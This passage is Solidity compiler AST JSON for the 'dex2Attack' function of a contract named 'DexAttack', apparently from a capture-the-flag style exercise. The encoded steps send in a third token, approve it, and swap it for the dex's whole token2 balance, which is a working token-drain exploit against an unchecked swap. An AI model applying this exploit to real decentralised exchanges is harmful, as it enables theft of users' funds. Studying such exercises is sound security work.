												"expression": {
													"arguments": [
														{
															"id": 1055,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "2034:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 1056,
															"name": "token1",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 727,
															"src": "2042:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"hexValue": "3435",
															"id": 1057,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2050:2:4",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_45_by_1",
																"typeString": "int_const 45"
															},
															"value": "45"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_rational_45_by_1",
																"typeString": "int_const 45"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 1052,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "2024:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1051,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "2019:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 1053,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2019:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 1054,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "2029:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "2019:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 1058,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2019:34:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1059,
												"nodeType": "ExpressionStatement",
												"src": "2019:34:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"id": 1064,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "2224:3:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1065,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "2228:6:4",
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "2224:10:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 1066,
															"name": "dex",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 733,
															"src": "2236:3:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"hexValue": "3930",
															"id": 1067,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2241:2:4",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_90_by_1",
																"typeString": "int_const 90"
															},
															"value": "90"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_rational_90_by_1",
																"typeString": "int_const 90"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 1061,
																	"name": "token3",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 731,
																	"src": "2203:6:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1060,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 664,
																"src": "2196:6:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1062,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2196:14:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$664",
																"typeString": "contract IERC20"
															}
														},
														"id": 1063,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "2211:12:4",
														"memberName": "transferFrom",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 663,
														"src": "2196:27:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,address,uint256) external returns (bool)"
														}
													},
													"id": 1068,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2196:48:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1069,
												"nodeType": "ExpressionStatement",
												"src": "2196:48:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"expression": {
																"id": 1074,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967281,
																"src": "2282:3:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 1075,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberLocation": "2286:6:4",
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"src": "2282:10:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"id": 1078,
																	"name": "this",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967268,
																	"src": "2302:4:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_DexAttack_$1114",
																		"typeString": "contract DexAttack"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_contract$_DexAttack_$1114",
																		"typeString": "contract DexAttack"
																	}
																],
																"id": 1077,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "2294:7:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 1076,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "2294:7:4",
																	"typeDescriptions": {}
																}
															},
															"id": 1079,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2294:13:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"hexValue": "3930",
															"id": 1080,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2309:2:4",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_90_by_1",
																"typeString": "int_const 90"
															},
															"value": "90"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_rational_90_by_1",
																"typeString": "int_const 90"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 1071,
																	"name": "token3",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 731,
																	"src": "2261:6:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1070,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 664,
																"src": "2254:6:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1072,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2254:14:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$664",
																"typeString": "contract IERC20"
															}
														},
														"id": 1073,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "2269:12:4",
														"memberName": "transferFrom",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 663,
														"src": "2254:27:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,address,uint256) external returns (bool)"
														}
													},
													"id": 1081,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2254:58:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1082,
												"nodeType": "ExpressionStatement",
												"src": "2254:58:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 1087,
															"name": "dex",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 733,
															"src": "2345:3:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"expression": {
																"arguments": [
																	{
																		"id": 1090,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "2355:4:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		},
																		"typeName": {
																			"id": 1089,
																			"name": "uint",
																			"nodeType": "ElementaryTypeName",
																			"src": "2355:4:4",
																			"typeDescriptions": {}
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_type$_t_uint256_$",
																			"typeString": "type(uint256)"
																		}
																	],
																	"id": 1088,
																	"name": "type",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 4294967269,
																	"src": "2350:4:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_metatype_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 1091,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "2350:10:4",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_meta_type_t_uint256",
																	"typeString": "type(uint256)"
																}
															},
															"id": 1092,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"memberLocation": "2361:3:4",
															"memberName": "max",
															"nodeType": "MemberAccess",
															"src": "2350:14:4",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 1084,
																	"name": "token3",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 731,
																	"src": "2329:6:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1083,
																"name": "IERC20",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 664,
																"src": "2322:6:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																	"typeString": "type(contract IERC20)"
																}
															},
															"id": 1085,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2322:14:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IERC20_$664",
																"typeString": "contract IERC20"
															}
														},
														"id": 1086,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "2337:7:4",
														"memberName": "approve",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 651,
														"src": "2322:22:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_uint256_$returns$_t_bool_$",
															"typeString": "function (address,uint256) external returns (bool)"
														}
													},
													"id": 1093,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2322:43:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1094,
												"nodeType": "ExpressionStatement",
												"src": "2322:43:4"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 1099,
															"name": "token3",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 731,
															"src": "2391:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 1100,
															"name": "token2",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 729,
															"src": "2399:6:4",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"arguments": [
																		{
																			"id": 1107,
																			"name": "this",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967268,
																			"src": "2440:4:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_contract$_DexAttack_$1114",
																				"typeString": "contract DexAttack"
																			}
																		],
																		"id": 1106,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "2432:7:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_address_$",
																			"typeString": "type(address)"
																		},
																		"typeName": {
																			"id": 1105,
																			"name": "address",
																			"nodeType": "ElementaryTypeName",
																			"src": "2432:7:4",
																			"typeDescriptions": {}
																		}
																	},
																	"id": 1108,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "2432:13:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"expression": {
																	"arguments": [
																		{
																			"id": 1102,
																			"name": "token3",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 731,
																			"src": "2414:6:4",
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		],
																		"id": 1101,
																		"name": "IERC20",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 664,
																		"src": "2407:6:4",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_contract$_IERC20_$664_$",
																			"typeString": "type(contract IERC20)"
																		}
																	},
																	"id": 1103,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"nameLocations": [],
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "2407:14:4",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_contract$_IERC20_$664",
																		"typeString": "contract IERC20"
																	}
																},
																"id": 1104,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberLocation": "2422:9:4",
																"memberName": "balanceOf",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 621,
																"src": "2407:24:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
																	"typeString": "function (address) view external returns (uint256)"
																}
															},
															"id": 1109,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2407:39:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"arguments": [
																{
																	"id": 1096,
																	"name": "dex",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 733,
																	"src": "2381:3:4",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1095,
																"name": "IDex",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 725,
																"src": "2376:4:4",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_contract$_IDex_$725_$",
																	"typeString": "type(contract IDex)"
																}
															},
															"id": 1097,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "2376:9:4",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_IDex_$725",
																"typeString": "contract IDex"
															}
														},
														"id": 1098,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberLocation": "2386:4:4",
														"memberName": "swap",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 724,
														"src": "2376:14:4",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256) external"
														}
													},
													"id": 1110,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2376:71:4",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1111,
												"nodeType": "ExpressionStatement",
												"src": "2376:71:4"
											}
										]
									},
									"functionSelector": "3e50269c",
									"id": 1113,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "dex2Attack",
									"nameLocation": "1336:10:4",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 914,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1346:2:4"
									},
									"returnParameters": {
										"id": 915,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1358:0:4"
									},
									"scope": 1114,
									"src": "1327:1127:4",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1115,
							"src": "254:2204:4",
							"usedErrors": []
						}
					],
					"src": "32:2426:4"
				},
				"id": 4
			}
		}
	}
}